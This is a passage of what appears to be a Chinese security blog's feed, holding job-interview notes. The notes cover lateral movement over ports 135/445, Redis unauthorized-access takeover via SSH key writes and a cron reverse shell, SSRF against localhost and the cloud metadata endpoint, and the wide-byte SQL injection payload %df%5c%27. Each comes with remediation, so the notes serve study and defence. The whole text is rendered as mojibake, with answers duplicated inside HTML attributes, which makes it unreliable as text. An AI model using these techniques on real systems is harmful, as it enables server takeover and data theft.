href="#å†…ç½‘æ¸—é€æ¨ªå‘æ‰‹æ®µï¼Œ135ã€445ç«¯å£" class="headerlink" title="å†…ç½‘æ¸—é€æ¨ªå‘æ‰‹æ®µï¼Œ135ã€445ç«¯å£"></a>å†…ç½‘æ¸—é€æ¨ªå‘æ‰‹æ®µï¼Œ135ã€445ç«¯å£</h3><p>åœ¨å†…ç½‘æ¸—é€ä¸­ï¼Œ135å’Œ445ç«¯å£å¸¸ç”¨äºæ¨ªå‘ç§»åŠ¨ï¼š</p><ul><li><strong>135ç«¯å£ï¼ˆRPCï¼‰</strong>ï¼šç”¨äºè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼Œå¯ä»¥åˆ©ç”¨RPCæ¼æ´è¿›è¡Œæƒé™æå‡å’Œæ¨ªå‘ç§»åŠ¨ã€‚</li><li><strong>445ç«¯å£ï¼ˆSMBï¼‰</strong>ï¼šç”¨äºæ–‡ä»¶å…±äº«å’Œæ‰“å°æœåŠ¡ï¼Œå¯ä»¥åˆ©ç”¨SMBæ¼æ´è¿›è¡Œæ–‡ä»¶è¯»å–ã€å†™å…¥å’Œå‘½ä»¤æ‰§è¡Œã€‚</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€å·¥ä½œã€‘é¢è¯•é¢˜æ•´ç† åº”ç”¨å®‰å…¨ç­‰</title>
      <link href="/2024/03/03/work/workpre1/"/>
      <url>/2024/03/03/work/workpre1/</url>
      
        <content type="html"><![CDATA[<h2 id="åº”ç”¨å®‰å…¨å²—ä½"><a href="#åº”ç”¨å®‰å…¨å²—ä½" class="headerlink" title="åº”ç”¨å®‰å…¨å²—ä½"></a>åº”ç”¨å®‰å…¨å²—ä½</h2><hr><h3 id="Redis-æœªæˆæƒè®¿é—®æ¼æ´å¦‚ä½•å…¥ä¾µåˆ©ç”¨ï¼Ÿ"><a href="#Redis-æœªæˆæƒè®¿é—®æ¼æ´å¦‚ä½•å…¥ä¾µåˆ©ç”¨ï¼Ÿ" class="headerlink" title="Redis æœªæˆæƒè®¿é—®æ¼æ´å¦‚ä½•å…¥ä¾µåˆ©ç”¨ï¼Ÿ"></a>Redis æœªæˆæƒè®¿é—®æ¼æ´å¦‚ä½•å…¥ä¾µåˆ©ç”¨ï¼Ÿ</h3><h2 id="æ¼æ´åŸç†ï¼šRedis-é»˜è®¤ç›‘å¬åœ¨-6379-ç«¯å£ï¼Œè‹¥æœªè®¾ç½®å¯†ç æˆ–ç»‘å®šç‰¹å®š-IPï¼Œæ”»å‡»è€…å¯ç›´æ¥è®¿é—®ã€‚åˆ©ç”¨æ–¹å¼ï¼š-å†™å…¥-SSH-å…¬é’¥ï¼šåˆ©ç”¨-CONFIG-SET-å‘½ä»¤ä¿®æ”¹é…ç½®ï¼Œè®¾ç½®æŒä¹…åŒ–ç›®å½•ä¸º-root-ssh-ï¼Œæ–‡ä»¶åä¸º-authorized-keysï¼Œç„¶åä½¿ç”¨-SET-å‘½ä»¤å†™å…¥å…¬é’¥ï¼Œæœ€ç»ˆé€šè¿‡-SSH-ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚-åå¼¹-Shellï¼šé€šè¿‡-CONFIG-SET-å‘½ä»¤ä¿®æ”¹æŒä¹…åŒ–ç›®å½•ä¸º-var-spool-cron-ï¼Œæ–‡ä»¶åä¸º-rootï¼Œå†…å®¹ä¸ºåå‘-shell-å‘½ä»¤ï¼Œä¿å­˜åè§¦å‘å®šæ—¶ä»»åŠ¡æ‰§è¡Œï¼Œè·å–è¿œç¨‹-shellã€‚ä¿®å¤æ–¹æ¡ˆï¼š-è®¾ç½®å¯†ç ï¼šåœ¨-redis-conf-ä¸­é…ç½®-requirepass-ï¼Œå¯ç”¨å¯†ç è®¤è¯ã€‚-ç»‘å®š-IPï¼šåœ¨-redis-conf-ä¸­é…ç½®-bind-127-0-0-1ï¼Œé™åˆ¶ä»…æœ¬åœ°è®¿é—®ã€‚-é˜²ç«å¢™é™åˆ¶ï¼šä½¿ç”¨é˜²ç«å¢™è§„åˆ™é™åˆ¶å¯¹-6379-ç«¯å£çš„è®¿é—®ï¼Œä»…å…è®¸å¯ä¿¡-IPã€‚-ç¦ç”¨å±é™©å‘½ä»¤ï¼šåœ¨-redis-conf-ä¸­ä½¿ç”¨-rename-command-ç¦ç”¨æˆ–é‡å‘½åé«˜å±å‘½ä»¤ï¼Œå¦‚-CONFIGã€FLUSHDB-ç­‰ã€‚"><a href="#æ¼æ´åŸç†ï¼šRedis-é»˜è®¤ç›‘å¬åœ¨-6379-ç«¯å£ï¼Œè‹¥æœªè®¾ç½®å¯†ç æˆ–ç»‘å®šç‰¹å®š-IPï¼Œæ”»å‡»è€…å¯ç›´æ¥è®¿é—®ã€‚åˆ©ç”¨æ–¹å¼ï¼š-å†™å…¥-SSH-å…¬é’¥ï¼šåˆ©ç”¨-CONFIG-SET-å‘½ä»¤ä¿®æ”¹é…ç½®ï¼Œè®¾ç½®æŒä¹…åŒ–ç›®å½•ä¸º-root-ssh-ï¼Œæ–‡ä»¶åä¸º-authorized-keysï¼Œç„¶åä½¿ç”¨-SET-å‘½ä»¤å†™å…¥å…¬é’¥ï¼Œæœ€ç»ˆé€šè¿‡-SSH-ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚-åå¼¹-Shellï¼šé€šè¿‡-CONFIG-SET-å‘½ä»¤ä¿®æ”¹æŒä¹…åŒ–ç›®å½•ä¸º-var-spool-cron-ï¼Œæ–‡ä»¶åä¸º-rootï¼Œå†…å®¹ä¸ºåå‘-shell-å‘½ä»¤ï¼Œä¿å­˜åè§¦å‘å®šæ—¶ä»»åŠ¡æ‰§è¡Œï¼Œè·å–è¿œç¨‹-shellã€‚ä¿®å¤æ–¹æ¡ˆï¼š-è®¾ç½®å¯†ç ï¼šåœ¨-redis-conf-ä¸­é…ç½®-requirepass-ï¼Œå¯ç”¨å¯†ç è®¤è¯ã€‚-ç»‘å®š-IPï¼šåœ¨-redis-conf-ä¸­é…ç½®-bind-127-0-0-1ï¼Œé™åˆ¶ä»…æœ¬åœ°è®¿é—®ã€‚-é˜²ç«å¢™é™åˆ¶ï¼šä½¿ç”¨é˜²ç«å¢™è§„åˆ™é™åˆ¶å¯¹-6379-ç«¯å£çš„è®¿é—®ï¼Œä»…å…è®¸å¯ä¿¡-IPã€‚-ç¦ç”¨å±é™©å‘½ä»¤ï¼šåœ¨-redis-conf-ä¸­ä½¿ç”¨-rename-command-ç¦ç”¨æˆ–é‡å‘½åé«˜å±å‘½ä»¤ï¼Œå¦‚-CONFIGã€FLUSHDB-ç­‰ã€‚" class="headerlink" title="æ¼æ´åŸç†ï¼šRedis é»˜è®¤ç›‘å¬åœ¨ 6379 ç«¯å£ï¼Œè‹¥æœªè®¾ç½®å¯†ç æˆ–ç»‘å®šç‰¹å®š IPï¼Œæ”»å‡»è€…å¯ç›´æ¥è®¿é—®ã€‚åˆ©ç”¨æ–¹å¼ï¼š- å†™å…¥ SSH å…¬é’¥ï¼šåˆ©ç”¨ CONFIG SET å‘½ä»¤ä¿®æ”¹é…ç½®ï¼Œè®¾ç½®æŒä¹…åŒ–ç›®å½•ä¸º /root/.ssh/ï¼Œæ–‡ä»¶åä¸º authorized_keysï¼Œç„¶åä½¿ç”¨ SET å‘½ä»¤å†™å…¥å…¬é’¥ï¼Œæœ€ç»ˆé€šè¿‡ SSH ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚- åå¼¹ Shellï¼šé€šè¿‡ CONFIG SET å‘½ä»¤ä¿®æ”¹æŒä¹…åŒ–ç›®å½•ä¸º /var/spool/cron/ï¼Œæ–‡ä»¶åä¸º rootï¼Œå†…å®¹ä¸ºåå‘ shell å‘½ä»¤ï¼Œä¿å­˜åè§¦å‘å®šæ—¶ä»»åŠ¡æ‰§è¡Œï¼Œè·å–è¿œç¨‹ shellã€‚ä¿®å¤æ–¹æ¡ˆï¼š- è®¾ç½®å¯†ç ï¼šåœ¨ redis.conf ä¸­é…ç½® requirepass &lt;password&gt;ï¼Œå¯ç”¨å¯†ç è®¤è¯ã€‚- ç»‘å®š IPï¼šåœ¨ redis.conf ä¸­é…ç½® bind 127.0.0.1ï¼Œé™åˆ¶ä»…æœ¬åœ°è®¿é—®ã€‚- é˜²ç«å¢™é™åˆ¶ï¼šä½¿ç”¨é˜²ç«å¢™è§„åˆ™é™åˆ¶å¯¹ 6379 ç«¯å£çš„è®¿é—®ï¼Œä»…å…è®¸å¯ä¿¡ IPã€‚- ç¦ç”¨å±é™©å‘½ä»¤ï¼šåœ¨ redis.conf ä¸­ä½¿ç”¨ rename-command ç¦ç”¨æˆ–é‡å‘½åé«˜å±å‘½ä»¤ï¼Œå¦‚ CONFIGã€FLUSHDB ç­‰ã€‚"></a><strong>æ¼æ´åŸç†</strong>ï¼šRedis é»˜è®¤ç›‘å¬åœ¨ 6379 ç«¯å£ï¼Œè‹¥æœªè®¾ç½®å¯†ç æˆ–ç»‘å®šç‰¹å®š IPï¼Œæ”»å‡»è€…å¯ç›´æ¥è®¿é—®ã€‚<br><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼š<br>- <strong>å†™å…¥ SSH å…¬é’¥</strong>ï¼šåˆ©ç”¨ <code>CONFIG SET</code> å‘½ä»¤ä¿®æ”¹é…ç½®ï¼Œè®¾ç½®æŒä¹…åŒ–ç›®å½•ä¸º <code>/root/.ssh/</code>ï¼Œæ–‡ä»¶åä¸º <code>authorized_keys</code>ï¼Œç„¶åä½¿ç”¨ <code>SET</code> å‘½ä»¤å†™å…¥å…¬é’¥ï¼Œæœ€ç»ˆé€šè¿‡ SSH ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚<br>- <strong>åå¼¹ Shell</strong>ï¼šé€šè¿‡ <code>CONFIG SET</code> å‘½ä»¤ä¿®æ”¹æŒä¹…åŒ–ç›®å½•ä¸º <code>/var/spool/cron/</code>ï¼Œæ–‡ä»¶åä¸º <code>root</code>ï¼Œå†…å®¹ä¸ºåå‘ shell å‘½ä»¤ï¼Œä¿å­˜åè§¦å‘å®šæ—¶ä»»åŠ¡æ‰§è¡Œï¼Œè·å–è¿œç¨‹ shellã€‚<br><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- <strong>è®¾ç½®å¯†ç </strong>ï¼šåœ¨ <code>redis.conf</code> ä¸­é…ç½® <code>requirepass &lt;password&gt;</code>ï¼Œå¯ç”¨å¯†ç è®¤è¯ã€‚<br>- <strong>ç»‘å®š IP</strong>ï¼šåœ¨ <code>redis.conf</code> ä¸­é…ç½® <code>bind 127.0.0.1</code>ï¼Œé™åˆ¶ä»…æœ¬åœ°è®¿é—®ã€‚<br>- <strong>é˜²ç«å¢™é™åˆ¶</strong>ï¼šä½¿ç”¨é˜²ç«å¢™è§„åˆ™é™åˆ¶å¯¹ 6379 ç«¯å£çš„è®¿é—®ï¼Œä»…å…è®¸å¯ä¿¡ IPã€‚<br>- <strong>ç¦ç”¨å±é™©å‘½ä»¤</strong>ï¼šåœ¨ <code>redis.conf</code> ä¸­ä½¿ç”¨ <code>rename-command</code> ç¦ç”¨æˆ–é‡å‘½åé«˜å±å‘½ä»¤ï¼Œå¦‚ <code>CONFIG</code>ã€<code>FLUSHDB</code> ç­‰ã€‚</h2><h3 id="SSRF-æ¼æ´åŸç†ã€åˆ©ç”¨æ–¹å¼åŠä¿®å¤æ–¹æ¡ˆï¼ŸJava-å’Œ-PHP-çš„-SSRF-åŒºåˆ«ï¼Ÿ"><a href="#SSRF-æ¼æ´åŸç†ã€åˆ©ç”¨æ–¹å¼åŠä¿®å¤æ–¹æ¡ˆï¼ŸJava-å’Œ-PHP-çš„-SSRF-åŒºåˆ«ï¼Ÿ" class="headerlink" title="SSRF æ¼æ´åŸç†ã€åˆ©ç”¨æ–¹å¼åŠä¿®å¤æ–¹æ¡ˆï¼ŸJava å’Œ PHP çš„ SSRF åŒºåˆ«ï¼Ÿ"></a>SSRF æ¼æ´åŸç†ã€åˆ©ç”¨æ–¹å¼åŠä¿®å¤æ–¹æ¡ˆï¼ŸJava å’Œ PHP çš„ SSRF åŒºåˆ«ï¼Ÿ</h3><h2 id="æ¼æ´åŸç†ï¼šSSRFï¼ˆServer-Side-Request-Forgeryï¼‰æ¼æ´å…è®¸æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼Œç”±æœåŠ¡å™¨å‘èµ·ï¼Œè®¿é—®å†…éƒ¨æˆ–å¤–éƒ¨æœåŠ¡ã€‚åˆ©ç”¨æ–¹å¼ï¼š-è®¿é—®å†…ç½‘æœåŠ¡ï¼šé€šè¿‡æ„é€ è¯·æ±‚è®¿é—®å†…éƒ¨æœåŠ¡ï¼Œå¦‚-http-127-0-0-1-5000-adminï¼Œè·å–æ•æ„Ÿä¿¡æ¯ã€‚îˆ†-æ¢æµ‹å…ƒæ•°æ®æœåŠ¡ï¼šè®¿é—®äº‘æœåŠ¡çš„å…ƒæ•°æ®æ¥å£ï¼Œå¦‚-AWS-çš„-http-169-254-169-254-latest-meta-data-ï¼Œè·å–å®ä¾‹ä¿¡æ¯ã€‚-åå¼¹-Shellï¼šåˆ©ç”¨æ”¯æŒçš„åè®®ï¼ˆå¦‚-gopherï¼‰æ„é€ è¯·æ±‚ï¼Œåå‘è¿æ¥æ”»å‡»è€…ä¸»æœºï¼Œè·å–è¿œç¨‹-shellã€‚îˆ†Java-å’Œ-PHP-çš„-SSRF-åŒºåˆ«ï¼š-Javaï¼šHttpURLConnectionã€Apache-HttpClient-ç­‰ç±»é»˜è®¤æ”¯æŒå¤šç§åè®®ï¼Œå¯èƒ½è¢«ç”¨äº-SSRF-æ”»å‡»ã€‚Javaé€šå¸¸ä½¿ç”¨å¦‚HttpClientç­‰åº“å‘èµ·è¯·æ±‚ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„åº“çš„é…ç½®ä»¥é¿å…SSRFæ¼æ´ã€‚-PHPï¼šfile-get-contentsã€cURL-ç­‰å‡½æ•°å¯ç”¨äºå‘èµ·è¯·æ±‚ï¼Œéœ€æ³¨æ„åè®®é™åˆ¶ã€‚îˆ†ä¿®å¤æ–¹æ¡ˆï¼š-åè®®ç™½åå•ï¼šé™åˆ¶è¯·æ±‚åè®®ï¼Œä»…å…è®¸-HTTP-å’Œ-HTTPSã€‚-è¾“å…¥éªŒè¯ï¼šä¸¥æ ¼éªŒè¯ç”¨æˆ·è¾“å…¥çš„-URLï¼Œé˜²æ­¢éæ³•è¯·æ±‚ã€‚-é˜²ç«å¢™é™åˆ¶ï¼šä½¿ç”¨é˜²ç«å¢™è§„åˆ™é™åˆ¶å¯¹å†…éƒ¨æœåŠ¡çš„è®¿é—®ã€‚-äº‘å…ƒæ•°æ®é˜²æŠ¤ï¼šåœ¨äº‘ç¯å¢ƒä¸­ï¼Œä½¿ç”¨é˜²ç«å¢™è§„åˆ™é™åˆ¶å¯¹å…ƒæ•°æ®æœåŠ¡çš„è®¿é—®ã€‚"><a href="#æ¼æ´åŸç†ï¼šSSRFï¼ˆServer-Side-Request-Forgeryï¼‰æ¼æ´å…è®¸æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼Œç”±æœåŠ¡å™¨å‘èµ·ï¼Œè®¿é—®å†…éƒ¨æˆ–å¤–éƒ¨æœåŠ¡ã€‚åˆ©ç”¨æ–¹å¼ï¼š-è®¿é—®å†…ç½‘æœåŠ¡ï¼šé€šè¿‡æ„é€ è¯·æ±‚è®¿é—®å†…éƒ¨æœåŠ¡ï¼Œå¦‚-http-127-0-0-1-5000-adminï¼Œè·å–æ•æ„Ÿä¿¡æ¯ã€‚îˆ†-æ¢æµ‹å…ƒæ•°æ®æœåŠ¡ï¼šè®¿é—®äº‘æœåŠ¡çš„å…ƒæ•°æ®æ¥å£ï¼Œå¦‚-AWS-çš„-http-169-254-169-254-latest-meta-data-ï¼Œè·å–å®ä¾‹ä¿¡æ¯ã€‚-åå¼¹-Shellï¼šåˆ©ç”¨æ”¯æŒçš„åè®®ï¼ˆå¦‚-gopherï¼‰æ„é€ è¯·æ±‚ï¼Œåå‘è¿æ¥æ”»å‡»è€…ä¸»æœºï¼Œè·å–è¿œç¨‹-shellã€‚îˆ†Java-å’Œ-PHP-çš„-SSRF-åŒºåˆ«ï¼š-Javaï¼šHttpURLConnectionã€Apache-HttpClient-ç­‰ç±»é»˜è®¤æ”¯æŒå¤šç§åè®®ï¼Œå¯èƒ½è¢«ç”¨äº-SSRF-æ”»å‡»ã€‚Javaé€šå¸¸ä½¿ç”¨å¦‚HttpClientç­‰åº“å‘èµ·è¯·æ±‚ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„åº“çš„é…ç½®ä»¥é¿å…SSRFæ¼æ´ã€‚-PHPï¼šfile-get-contentsã€cURL-ç­‰å‡½æ•°å¯ç”¨äºå‘èµ·è¯·æ±‚ï¼Œéœ€æ³¨æ„åè®®é™åˆ¶ã€‚îˆ†ä¿®å¤æ–¹æ¡ˆï¼š-åè®®ç™½åå•ï¼šé™åˆ¶è¯·æ±‚åè®®ï¼Œä»…å…è®¸-HTTP-å’Œ-HTTPSã€‚-è¾“å…¥éªŒè¯ï¼šä¸¥æ ¼éªŒè¯ç”¨æˆ·è¾“å…¥çš„-URLï¼Œé˜²æ­¢éæ³•è¯·æ±‚ã€‚-é˜²ç«å¢™é™åˆ¶ï¼šä½¿ç”¨é˜²ç«å¢™è§„åˆ™é™åˆ¶å¯¹å†…éƒ¨æœåŠ¡çš„è®¿é—®ã€‚-äº‘å…ƒæ•°æ®é˜²æŠ¤ï¼šåœ¨äº‘ç¯å¢ƒä¸­ï¼Œä½¿ç”¨é˜²ç«å¢™è§„åˆ™é™åˆ¶å¯¹å…ƒæ•°æ®æœåŠ¡çš„è®¿é—®ã€‚" class="headerlink" title="æ¼æ´åŸç†ï¼šSSRFï¼ˆServer-Side Request Forgeryï¼‰æ¼æ´å…è®¸æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼Œç”±æœåŠ¡å™¨å‘èµ·ï¼Œè®¿é—®å†…éƒ¨æˆ–å¤–éƒ¨æœåŠ¡ã€‚åˆ©ç”¨æ–¹å¼ï¼š- è®¿é—®å†…ç½‘æœåŠ¡ï¼šé€šè¿‡æ„é€ è¯·æ±‚è®¿é—®å†…éƒ¨æœåŠ¡ï¼Œå¦‚ http://127.0.0.1:5000/adminï¼Œè·å–æ•æ„Ÿä¿¡æ¯ã€‚îˆ†- æ¢æµ‹å…ƒæ•°æ®æœåŠ¡ï¼šè®¿é—®äº‘æœåŠ¡çš„å…ƒæ•°æ®æ¥å£ï¼Œå¦‚ AWS çš„ http://169.254.169.254/latest/meta-data/ï¼Œè·å–å®ä¾‹ä¿¡æ¯ã€‚- åå¼¹ Shellï¼šåˆ©ç”¨æ”¯æŒçš„åè®®ï¼ˆå¦‚ gopherï¼‰æ„é€ è¯·æ±‚ï¼Œåå‘è¿æ¥æ”»å‡»è€…ä¸»æœºï¼Œè·å–è¿œç¨‹ shellã€‚îˆ†Java å’Œ PHP çš„ SSRF åŒºåˆ«ï¼š- Javaï¼šHttpURLConnectionã€Apache HttpClient ç­‰ç±»é»˜è®¤æ”¯æŒå¤šç§åè®®ï¼Œå¯èƒ½è¢«ç”¨äº SSRF æ”»å‡»ã€‚Javaé€šå¸¸ä½¿ç”¨å¦‚HttpClientç­‰åº“å‘èµ·è¯·æ±‚ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„åº“çš„é…ç½®ä»¥é¿å…SSRFæ¼æ´ã€‚- PHPï¼šfile_get_contentsã€cURL ç­‰å‡½æ•°å¯ç”¨äºå‘èµ·è¯·æ±‚ï¼Œéœ€æ³¨æ„åè®®é™åˆ¶ã€‚îˆ†ä¿®å¤æ–¹æ¡ˆï¼š- åè®®ç™½åå•ï¼šé™åˆ¶è¯·æ±‚åè®®ï¼Œä»…å…è®¸ HTTP å’Œ HTTPSã€‚- è¾“å…¥éªŒè¯ï¼šä¸¥æ ¼éªŒè¯ç”¨æˆ·è¾“å…¥çš„ URLï¼Œé˜²æ­¢éæ³•è¯·æ±‚ã€‚- é˜²ç«å¢™é™åˆ¶ï¼šä½¿ç”¨é˜²ç«å¢™è§„åˆ™é™åˆ¶å¯¹å†…éƒ¨æœåŠ¡çš„è®¿é—®ã€‚- äº‘å…ƒæ•°æ®é˜²æŠ¤ï¼šåœ¨äº‘ç¯å¢ƒä¸­ï¼Œä½¿ç”¨é˜²ç«å¢™è§„åˆ™é™åˆ¶å¯¹å…ƒæ•°æ®æœåŠ¡çš„è®¿é—®ã€‚"></a><strong>æ¼æ´åŸç†</strong>ï¼šSSRFï¼ˆServer-Side Request Forgeryï¼‰æ¼æ´å…è®¸æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼Œç”±æœåŠ¡å™¨å‘èµ·ï¼Œè®¿é—®å†…éƒ¨æˆ–å¤–éƒ¨æœåŠ¡ã€‚<br><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼š<br>- <strong>è®¿é—®å†…ç½‘æœåŠ¡</strong>ï¼šé€šè¿‡æ„é€ è¯·æ±‚è®¿é—®å†…éƒ¨æœåŠ¡ï¼Œå¦‚ <code>http://127.0.0.1:5000/admin</code>ï¼Œè·å–æ•æ„Ÿä¿¡æ¯ã€‚îˆ†<br>- <strong>æ¢æµ‹å…ƒæ•°æ®æœåŠ¡</strong>ï¼šè®¿é—®äº‘æœåŠ¡çš„å…ƒæ•°æ®æ¥å£ï¼Œå¦‚ AWS çš„ <code>http://169.254.169.254/latest/meta-data/</code>ï¼Œè·å–å®ä¾‹ä¿¡æ¯ã€‚<br>- <strong>åå¼¹ Shell</strong>ï¼šåˆ©ç”¨æ”¯æŒçš„åè®®ï¼ˆå¦‚ <code>gopher</code>ï¼‰æ„é€ è¯·æ±‚ï¼Œåå‘è¿æ¥æ”»å‡»è€…ä¸»æœºï¼Œè·å–è¿œç¨‹ shellã€‚îˆ†<br><strong>Java å’Œ PHP çš„ SSRF åŒºåˆ«</strong>ï¼š<br>- <strong>Java</strong>ï¼š<code>HttpURLConnection</code>ã€<code>Apache HttpClient</code> ç­‰ç±»é»˜è®¤æ”¯æŒå¤šç§åè®®ï¼Œå¯èƒ½è¢«ç”¨äº SSRF æ”»å‡»ã€‚Javaé€šå¸¸ä½¿ç”¨å¦‚HttpClientç­‰åº“å‘èµ·è¯·æ±‚ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„åº“çš„é…ç½®ä»¥é¿å…SSRFæ¼æ´ã€‚<br>- <strong>PHP</strong>ï¼š<code>file_get_contents</code>ã€<code>cURL</code> ç­‰å‡½æ•°å¯ç”¨äºå‘èµ·è¯·æ±‚ï¼Œéœ€æ³¨æ„åè®®é™åˆ¶ã€‚îˆ†<br><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- <strong>åè®®ç™½åå•</strong>ï¼šé™åˆ¶è¯·æ±‚åè®®ï¼Œä»…å…è®¸ HTTP å’Œ HTTPSã€‚<br>- <strong>è¾“å…¥éªŒè¯</strong>ï¼šä¸¥æ ¼éªŒè¯ç”¨æˆ·è¾“å…¥çš„ URLï¼Œé˜²æ­¢éæ³•è¯·æ±‚ã€‚<br>- <strong>é˜²ç«å¢™é™åˆ¶</strong>ï¼šä½¿ç”¨é˜²ç«å¢™è§„åˆ™é™åˆ¶å¯¹å†…éƒ¨æœåŠ¡çš„è®¿é—®ã€‚<br>- <strong>äº‘å…ƒæ•°æ®é˜²æŠ¤</strong>ï¼šåœ¨äº‘ç¯å¢ƒä¸­ï¼Œä½¿ç”¨é˜²ç«å¢™è§„åˆ™é™åˆ¶å¯¹å…ƒæ•°æ®æœåŠ¡çš„è®¿é—®ã€‚</h2><h3 id="å®½å­—èŠ‚æ³¨å…¥æ¼æ´åŸç†ã€åˆ©ç”¨æ–¹å¼åŠä¿®å¤æ–¹æ¡ˆï¼Ÿ"><a href="#å®½å­—èŠ‚æ³¨å…¥æ¼æ´åŸç†ã€åˆ©ç”¨æ–¹å¼åŠä¿®å¤æ–¹æ¡ˆï¼Ÿ" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥æ¼æ´åŸç†ã€åˆ©ç”¨æ–¹å¼åŠä¿®å¤æ–¹æ¡ˆï¼Ÿ"></a>å®½å­—èŠ‚æ³¨å…¥æ¼æ´åŸç†ã€åˆ©ç”¨æ–¹å¼åŠä¿®å¤æ–¹æ¡ˆï¼Ÿ</h3><h2 id="æ¼æ´åŸç†ï¼šå®½å­—èŠ‚æ³¨å…¥åˆ©ç”¨å¤šå­—èŠ‚ç¼–ç ï¼ˆå¦‚-GBKï¼‰ç‰¹æ€§ï¼Œç»•è¿‡å•å­—èŠ‚å­—ç¬¦é›†çš„è¿‡æ»¤ï¼Œå¯¼è‡´-SQL-æ³¨å…¥ã€‚åˆ©ç”¨æ–¹å¼ï¼š-ç»•è¿‡è¿‡æ»¤ï¼šåœ¨-GBK-ç¼–ç ä¸‹ï¼Œ-df-5c-27-è¢«è§£æä¸º-ï¼Œç»•è¿‡è¿‡æ»¤å™¨ï¼Œå¯¼è‡´-SQL-æ³¨å…¥ã€‚ä¿®å¤æ–¹æ¡ˆï¼š-ç»Ÿä¸€ç¼–ç ï¼šä½¿ç”¨-UTF-8-ç¼–ç ï¼Œé¿å…å®½å­—èŠ‚æ³¨å…¥ã€‚-å‚æ•°åŒ–æŸ¥è¯¢ï¼šä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ï¼Œé¿å…ç›´æ¥æ‹¼æ¥-SQLã€‚-è¾“å…¥éªŒè¯ï¼šä¸¥æ ¼éªŒè¯ç”¨æˆ·è¾“å…¥ï¼Œé˜²æ­¢æ¶æ„å­—ç¬¦ã€‚"><a href="#æ¼æ´åŸç†ï¼šå®½å­—èŠ‚æ³¨å…¥åˆ©ç”¨å¤šå­—èŠ‚ç¼–ç ï¼ˆå¦‚-GBKï¼‰ç‰¹æ€§ï¼Œç»•è¿‡å•å­—èŠ‚å­—ç¬¦é›†çš„è¿‡æ»¤ï¼Œå¯¼è‡´-SQL-æ³¨å…¥ã€‚åˆ©ç”¨æ–¹å¼ï¼š-ç»•è¿‡è¿‡æ»¤ï¼šåœ¨-GBK-ç¼–ç ä¸‹ï¼Œ-df-5c-27-è¢«è§£æä¸º-ï¼Œç»•è¿‡è¿‡æ»¤å™¨ï¼Œå¯¼è‡´-SQL-æ³¨å…¥ã€‚ä¿®å¤æ–¹æ¡ˆï¼š-ç»Ÿä¸€ç¼–ç ï¼šä½¿ç”¨-UTF-8-ç¼–ç ï¼Œé¿å…å®½å­—èŠ‚æ³¨å…¥ã€‚-å‚æ•°åŒ–æŸ¥è¯¢ï¼šä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ï¼Œé¿å…ç›´æ¥æ‹¼æ¥-SQLã€‚-è¾“å…¥éªŒè¯ï¼šä¸¥æ ¼éªŒè¯ç”¨æˆ·è¾“å…¥ï¼Œé˜²æ­¢æ¶æ„å­—ç¬¦ã€‚" class="headerlink" title="æ¼æ´åŸç†ï¼šå®½å­—èŠ‚æ³¨å…¥åˆ©ç”¨å¤šå­—èŠ‚ç¼–ç ï¼ˆå¦‚ GBKï¼‰ç‰¹æ€§ï¼Œç»•è¿‡å•å­—èŠ‚å­—ç¬¦é›†çš„è¿‡æ»¤ï¼Œå¯¼è‡´ SQL æ³¨å…¥ã€‚åˆ©ç”¨æ–¹å¼ï¼š- ç»•è¿‡è¿‡æ»¤ï¼šåœ¨ GBK ç¼–ç ä¸‹ï¼Œ%df%5c%27 è¢«è§£æä¸º &#39;ï¼Œç»•è¿‡è¿‡æ»¤å™¨ï¼Œå¯¼è‡´ SQL æ³¨å…¥ã€‚ä¿®å¤æ–¹æ¡ˆï¼š- ç»Ÿä¸€ç¼–ç ï¼šä½¿ç”¨ UTF-8 ç¼–ç ï¼Œé¿å…å®½å­—èŠ‚æ³¨å…¥ã€‚- å‚æ•°åŒ–æŸ¥è¯¢ï¼šä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ï¼Œé¿å…ç›´æ¥æ‹¼æ¥ SQLã€‚- è¾“å…¥éªŒè¯ï¼šä¸¥æ ¼éªŒè¯ç”¨æˆ·è¾“å…¥ï¼Œé˜²æ­¢æ¶æ„å­—ç¬¦ã€‚"></a><strong>æ¼æ´åŸç†</strong>ï¼šå®½å­—èŠ‚æ³¨å…¥åˆ©ç”¨å¤šå­—èŠ‚ç¼–ç ï¼ˆå¦‚ GBKï¼‰ç‰¹æ€§ï¼Œç»•è¿‡å•å­—èŠ‚å­—ç¬¦é›†çš„è¿‡æ»¤ï¼Œå¯¼è‡´ SQL æ³¨å…¥ã€‚<br><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼š<br>- <strong>ç»•è¿‡è¿‡æ»¤</strong>ï¼šåœ¨ GBK ç¼–ç ä¸‹ï¼Œ<code>%df%5c%27</code> è¢«è§£æä¸º <code>&#39;</code>ï¼Œç»•è¿‡è¿‡æ»¤å™¨ï¼Œå¯¼è‡´ SQL æ³¨å…¥ã€‚<br><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- <strong>ç»Ÿä¸€ç¼–ç </strong>ï¼šä½¿ç”¨ UTF-8 ç¼–ç ï¼Œé¿å…å®½å­—èŠ‚æ³¨å…¥ã€‚<br>- <strong>å‚æ•°åŒ–æŸ¥è¯¢</strong>ï¼šä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ï¼Œé¿å…ç›´æ¥æ‹¼æ¥ SQLã€‚<br>- <strong>è¾“å…¥éªŒè¯</strong>ï¼šä¸¥æ 